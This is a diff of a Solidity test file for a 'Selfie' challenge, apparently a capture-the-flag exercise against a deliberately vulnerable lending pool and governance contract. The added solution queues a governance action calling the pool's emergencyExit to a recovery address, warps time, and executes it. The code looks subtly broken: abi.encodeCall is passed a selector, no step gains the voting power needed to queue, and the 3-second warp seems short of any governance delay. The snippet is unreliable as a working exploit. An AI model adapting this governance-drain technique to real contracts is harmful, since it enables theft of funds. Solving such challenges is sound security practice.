@@ -62,7 +62,11 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+
+        bytes memory data = abi.encodeCall(pool.emergencyExit.selector, recovery);
+        uint256 actionId = governance.queueAction(address(pool), 0, data);
+        vm.warp(block.timestamp + 3 seconds);
+        governance.executeAction(actionId);
     }
 
     /**
